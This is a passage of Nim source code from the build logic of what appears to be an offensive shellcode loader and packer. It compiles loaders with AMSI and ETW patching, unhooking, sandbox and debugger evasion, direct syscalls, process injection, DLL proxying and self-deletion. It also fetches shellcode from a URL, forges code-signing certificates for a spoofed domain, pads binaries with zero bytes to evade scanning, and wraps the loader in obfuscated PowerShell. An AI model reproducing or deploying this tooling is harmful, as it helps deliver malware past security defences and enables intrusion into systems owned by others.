            basicCompileFlags.add(fmt"nim c -d=release --hint:pattern:off --warning:all:off --cc:clang --passL:-s --passC:'-mllvm -bcf -mllvm -sub -mllvm -fla -mllvm -split -aesSeed={aesSeed}'")
        else:
            echo "[!] Obfuscator-LLVM or wclang not installed or in path! Ensure that you can run 'x86_64-w64-mingw32-clang -v' and it shows 'Obfuscator-LLVM'."
            quit()
elif system.hostOS == "windows":
    # there's a bug in my modified denim, which makes "--" out of "-d" for the first argument when using multiple arguments, so only one can be accepted at the moment
    if (denim):
        basicCompileFlags = "-d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader    
    else:
        basicCompileFlags = "nim c -d:release --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
elif system.hostOS == "linux":
    basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader

if((existingprocessInjection == false) and (remoteinject)):
    basicCompileFlags.add("-d:spawninject ")

if (retrieveFromFile):
    stub.add(ShellcodefromFileStub)
elif (retrieveFromURL):
    stub.add(ShellcodefromURLStub)
else:
    basicCompileFlags.add("-d:PayloadEmbedded ")

if(dripallocate):
    basicCompileFlags.add("-d:AllocateDripStyle ")

if(antidebug):
    basicCompileFlags.add("-d:AntiDebug ")

if(macPayload):
    basicCompileFlags.add("-d:macPayload ")

if(unhook):
    basicCompileFlags.add("-d:unhook ")

if(psout):
    basicCompileFlags.add("-d:powershell ")

if(useQueueAPC):
    basicCompileFlags.add("-d:QueueAPC ")

if(not defaultSandBoxChecks):
    basicCompileFlags.add("-d:SkipDefaultSandBoxChecks ")

if(ETW):
    basicCompileFlags.add("-d:HardwareETW ")

if(AMSIProviderPatch):
    basicCompileFlags.add("-d:ProviderPatch ")

if(RWX == false):
    basicCompileFlags.add("-d:RX ")

if(jmpEntry):
    basicCompileFlags.add("-d:JmpEntry ")

if(selfdelete):
    basicCompileFlags.add("-d:SelfDelete ")

if(AMSI and oneShot):
    basicCompileFlags.add("-d:oneshot ")

if (dllProxy):
    basicCompileFlags.add("--mm:orc --threads:on ")
    basicCompileFlags.add("-d:proxy ")

if(service):
    basicCompileFlags.add("-d:service ")

if(unhook):
    basicCompileFlags.add("-d:unhook ")

if(dllProxy):
    when system.hostOS == "windows":
        basicCompileFlags.add(fmt" --passl:{packerpath}\\build\\{randValue}.def ")
    else:
        basicCompileFlags.add(fmt" --passl:{packerpath}/build/{randValue}.def ")

if(denim):
    basicCompileFlags.add("-d:denim ")

if(callbackexecute):
    basicCompileFlags.add("-d:Callback ")

if(wait):
    basicCompileFlags.add("-d:wait ")

if(blockDLLs):
    basicCompileFlags.add("-d:blockDLLs ")

if(csharp):
    basicCompileFlags.add("-d:csharp ")

if(gosleep):
    basicCompileFlags.add("-d:sleep ")

if(remoteinject):
    basicCompileFlags.add("-d:remoteinject ")
else:
    basicCompileFlags.add("-d:localinject ")
if(remoteMapSection):
    basicCompileFlags.add("-d:remoteMapSection ")

if(COMVARETW):
    basicCompileFlags.add("-d:COMVARETW ")

if(service):
    basicCompileFlags.add("--mm:none ")

if (noNimMain):
    when system.hostOS == "windows":
        basicCompileFlags.add(fmt"--passl:{packerPath}\\dllProxy\nonimmain.def ")
    else:
        basicCompileFlags.add(fmt"--passl:{packerPath}/dllProxy/nonimmain.def ")

if (retrieveFromURL):
    if(shellcodeURL.contains("https") or shellcodeURL.contains("HTTPS")):
        basicCompileFlags.add("-d:ssl ")
    elif(not shellcodeURL.contains("http")):
        echo "[!] URL must contain http:// or https://"
        quit()
    else:
        basicCompileFlags.add("-d:http ")

if(hellsgate):
    basicCompileFlags.add("-d:Hellsgate ")
elif(getfreshstub):
    basicCompileFlags.add("-d:GetSyscallStub ")
elif(syswhispers):
    basicCompileFlags.add("-d:SysWhispers ")

if (verbose):
    basicCompileFlags.add("-d:verbose ")

if (dllClone == false):
    basicCompileFlags.add("-d:notcloned ")

if embeddedArguments:
    basicCompileFlags.add("-d:args ")

if ((dllProxy == false) #[and (dllClone == false)]#):
    basicCompileFlags.add("-d:defaultMain ")

if(dllClone):
    basicCompileFlags.add("--mm:none ")
    basicCompileFlags.add("-d:cloned ")

if (big):
    basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")

if (metadata and (not compileX86)): # compiled .o files only work for x64, didnt compile for x86 so far
    if (dll_out or cpl):
        when system.hostOS == "windows":
            basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
        else:
            basicCompileFlags.add(fmt"--passL:{packerPath}/resource/dll.o ")    
    else:
        when system.hostOS == "windows":
            basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\cmd.o ")
        else:
            basicCompileFlags.add(fmt"--passL:{packerPath}/resource/cmd.o ")

if(fluctuate):
    basicCompileFlags.add(fmt"-d:Fluctuate ")

if (compileX86):
    basicCompileFlags.add("--cpu:i386 ")

if (wow64):
    basicCompileFlags.add("-d:wow64 ")

if not noDInvoke:
    basicCompileFlags.add("-d:DInvoke ")

if (spoofArgs != ""):
    basicCompileFlags.add(fmt"-d:spoof_args ")

if (sleepinbetween > 0):
    basicCompileFlags.add(fmt"-d:sleepinbetween ")

if localCreateThread:
    basicCompileFlags.add("-d:LocalCreateThread ")

if (dll_out or cpl):
    #if (processname == ""): # Why did I do that? It make no sense.
    #    basicCompileFlags.add("--app=lib --nomain -d:lib_only ")
    #else:
    basicCompileFlags.add("--app=lib -d:lib_only --nomain ")
else:
    if(hide):
        basicCompileFlags.add("--app=gui ")
    else:
        basicCompileFlags.add("--app=console ")
    if (reflective):
        basicCompileFlags.add("--passL:-Wl,--dynamicbase,--export-all-symbols ")

if((syswhispers != true) and (hellsgate != true)):
    if system.hostOS == "windows":
        basicCompileFlags.add("--passc=-flto --passl=-flto ")

# for e.g. CNA Scripts
when system.hostOS == "windows":
    if (denim):
        basicCompileFlags.add(fmt"-p:""{packerPath}""")
    else:
        basicCompileFlags.add(fmt"-p:""{packerPath}"" ")
else:
    basicCompileFlags.add(fmt"-p:'{packerPath}' ")

if(denim == false):
    basicCompileFlags.add(fmt"--out={outfile} Loader.nim")

if debugMode:
    basicCompileFlags = basicCompileFlags.replace("-d:release", "-d:debug")
    basicCompileFlags = basicCompileFlags.replace("--hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size", "")
    basicCompileFlags = basicCompileFlags.replace("--app=console --passc=-flto --passl=-flto", "")

echo "Compile command:"
echo basicCompileFlags
echo "\n\n"

if(sourceonly):
    if(psout or dllproxy or denim or replace or dllclone):
        echo "[!] You specified one of psout, dllproxy, dllclone, denim or replace. That has to be done by yourself as you also specified sourceonly."
    quit()

when system.hostOS == "windows":
    if (denim):
        var exist: bool = fileExists(".\\denim\\denim.exe")
        # cause some compile problems
        basicCompileFlags = basicCompileFlags.replace("--passc=-flto --passl=-flto ", "")
        basicCompileFlags = basicCompileFlags.replace("-d:danger -d:strip ", "")
        if (exist):
            # An additional whitespace at the end causes an compiler error here, so we'll remove it
            basicCompileFlags = basicCompileFlags.replace(" \r\n", "")
            stub = stub.replace("import nimstrenc", "")
            stub = stub.replace("when not defined(proxy):", "")
            stub = stub.replace("when defined(notcloned):", "")
            writeFile("Loader.nim", stub)

            echo "Denim compile argument: \r\n"

            echo fmt".\\denim\\denim.exe compile Loader.nim -A ""{basicCompileFlags}""\r\n"
            discard os.execShellCmd(fmt".\\denim\\denim.exe compile Loader.nim -A ""{basicCompileFlags}""")
            
            var exists: bool = true
            try:
                var fileCheck = readFile("Loader.exe")
            except:
                exists = false
            if(exists):
                let msg = fmt"[!] Encrypted file saved as 'Loader.exe' (--output FilaName is ignored by denim)"
                echo "\n" & msg
                if(replace):
                    var randstring: string = rndStr(2)
                    echo fmt"[!] ---> replacing nim with {randstring} "
                    discard exec_cmd_ex(fmt"nimgrep nim --replace {randstring} {outfile}")
            else:
                echo "\r\nCompilation failed! Check the error message\r\n"
                quit()
elif system.hostOS == "linux":
    if (denim):
        echo "No Denim support for Linux systems, sorry!"

discard os.execShellCmd(basicCompileFlags)

proc replaceList () =
    var words: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = "Dicts\\toReplace.txt"
    else:
        dictionary = "Dicts/toReplace.txt"
    for line in lines dictionary:
      words.add(line)
    var length: int = len(words) - 1
    for i in 0..length:
        var wordLength: int = len(words[i])
        var replacelength = wordLength - 1
        #echo words[i]
        #echo wordLength
        var randstring: string = rndStr(replacelength)
        echo fmt"[!] ---> replacing {words[i]} with {randstring} "
        var command: string = fmt"nimgrep ""{words[i]}"""
        command.add(fmt" --replace {randstring} {outfile}")
        echo command
        discard exec_cmd_ex(command)


# we need a function here, that takes the output file and retrieves a list of all bytes from it separated with a "," and then replaces the egg string QWERQWERQWER in the file Script.ps1 with the list of bytes
proc WritePS1() =
    var exists: bool = true
    try:
        var fileCheck = readFile(fmt"{outfile}")
    except:
        exists = false
    if(exists):
        var file = open(fmt"{outfile}", fmRead)
        var bytes: seq[byte] = toByteSeq(file.readAll())
        file.close()
        var length: int = len(bytes) - 1
        var byteList: string = ""
        for i in 0..length:
            byteList.add(fmt"{bytes[i]},")
        byteList = byteList[0..^2]
        var script: string
        if(psobfs):
            script = PowershellObfsTemplate
        else:
            script = Powershelltemplate
        script = script.replace("QWERQWERQWER", byteList)

        # Now Obfuscate the Script by replacing all VAR0001 to VAR0999 variables with random strings as well as FUN001 to FUN999 functions, ERROR01 to ERROR99 error messages and so on
        var words: seq[string] = @["VAR", "FUN", "CONST", "ERROR", "LYRICS"]
        var wordlength: int = len(words) - 1
        var maxWords: int = 999
        if(psobfs):
            words[1] = "XXXXXX" # we don't want to replace any names, as that breaks functionality.
            words[2] = "XXXXXX"
            words[3] = "XXXXXX"
            words[0] = "XXXXXX"
            
        for i in 0..wordlength:
            if (words[i] == "VAR"):
                maxWords = 380
            elif (words[i] == "FUN"):
                maxWords = 100
            elif (words[i] == "CONST"):
                maxWords = 300
            elif (words[i] == "ERROR"):
                maxWords = 100
            if (words[i] == "LYRICS"):
                var lyrics: seq[string]
                var dictionary: string
                when system.hostOS == "windows":
                    dictionary = "Dicts\\lyrics.txt"
                else:
                    dictionary = "Dicts/lyrics.txt"
                for line in lines dictionary:
                    lyrics.add(line)
                var length: int = len(lyrics) - 1
                for j in 0..1150:
                    var randstring: string = ""
                    if(uselyrics):
                        for k in 0..10:
                            randstring.add(fmt"{lyrics[rand(0..length)]}")
                    #echo "Replacing " & fmt"{words[i]}{j:03d}" & " with " & randstring
                    script = script.replace(fmt"{words[i]}{j:03d}", randstring)
            else:
                for j in 0..maxWords:
                    var randstring: string = rndStr(10)
                    #echo "Replacing " & fmt"{words[i]}{j:03d}" & " with " & randstring
                    script = script.replace(fmt"{words[i]}{j:03d}", randstring)
            
            



        writeFile(fmt"{outfile}.ps1", script)
    else:
        echo fmt"[!] File {outfile}.ps1 not found, skipping byte list creation"



if(replace):
    replaceList()

if(dll_out):
    if(dllclone):
        echo fmt"[!] Cloning the DLL {dllToClone} API imports via NetClone/PyClone:"
        when system.hostOS == "windows":
            echo "[*] Using NetClone with command:"
            echo fmt"{packerPath}\NetClone\NetClone.exe --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}"
            discard os.execShellCmd(fmt"{packerPath}\NetClone\NetClone.exe --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
        else:
            echo "[*] Using PyClone with command:"
            echo fmt"{packerPath}\NetClone\PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}"
            discard os.execShellCmd(fmt"{packerPath}\NetClone\PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")


var exists: bool = true
try:
    var fileCheck = readFile(fmt"{outfile}")
except:
    exists = false

if(exists):
    let msg = fmt"[!] Loader saved to {outfile}"
    echo "\n" & msg
    if(retrieveFromFile):
        echo fmt"[!] Encrypted Payload saved to {shellcodeFile[0]}"
    if (callobfs):
        when system.hostOS == "windows":
            var outfileonlyname = outfile.replace(packerPath, "")
            echo "\r\nObfuscating some Windows API's via CallObfuscator:\r\n"
            echo exec_cmd_ex(fmt"cobf\cobf_x64.exe {outfile} cobf\{outfileonlyname} cobf\config.ini")
            echo "\r\n"
            echo fmt"Obfuscated binary saved to: cobf\{outfileonlyname}"
            outfile = packerPath & "\\" & fmt"cobf\{outfileonlyname}"
        else:
            echo "Only usable from a Windows OS, sorry!"

    if (sign):
        echo "[*] Using Limelighter to generate a fake code signing certificate for the binary"
        echo fmt"[*] The domain to spoof the certificate from will be {signdomain}"
        var extension: string = ".exe"
        if (cpl):
            extension = ".cpl"
        elif(dll_out):
            extension = ".dll"
        if system.hostOS == "linux":
            discard os.execShellCmd(fmt"{packerPath}/LimeLighter/Limelighter -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
        when system.hostOS == "windows":
            discard os.execShellCmd(fmt"{packerPath}\LimeLighter\Limelighter.exe -Domain {signdomain} -I {outfile} -O {outfile}.Signed{extension}")
        if (dll_out):
            outfile.add(fmt".Signed{extension}")
        else:
            outfile.add(fmt".Signed{extension}")

    if (pump):
        for m in pumpargs:
            if(m == "size"):
                var pumpexecutable = readFile(outfile)
                var pumpzero: seq[byte] = @[byte 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00]
                proc pumpHard(number: int): seq[byte] =
                    var pump: seq[byte] = pumpzero
                    for i in 0 ..< number:
                        pump.add(pumpzero)
                    return pump
                var pumped: seq[byte] = pumpHard(rand(952182..1161782)) 
                var pumpsequence: seq[byte] = toByteSeq(pumpexecutable)
                pumpsequence.add(pumped)
                writeFile(fmt"{outfile}",pumpsequence)

    if (retrieveFromURL):
        echo fmt"[!] Make sure to host the {shellcodeFile[0]} file on your webserver with the correct filename to have a working payload ;-)"

    if (dllProxy):
        echo fmt"[!] Original DLL saved as {randValue}.dll - you need to copy both files into the target directory to have a working payload ;-)"
    if(psout):
        WritePS1()
        echo "\r\nPowershell script saved to: " & fmt"{outfile}.ps1"
        # Todo: Obfuscate the Script by replacing all VAR0001 to VAR0999 variables with random strings as well as FUN001 to FUN999 functions, ERROR01 to ERROR99 error messages and so on








else:
    echo "\r\nCompilation failed!! Check the error message.\r\n"


#[Here comes a function, that takes an string as input and pushes that into a char array ]#
proc toByteSeq(s: string): seq[byte] =
    var result: seq[byte] = @[]
    for c in s:
        result.add(c.byte)
    return result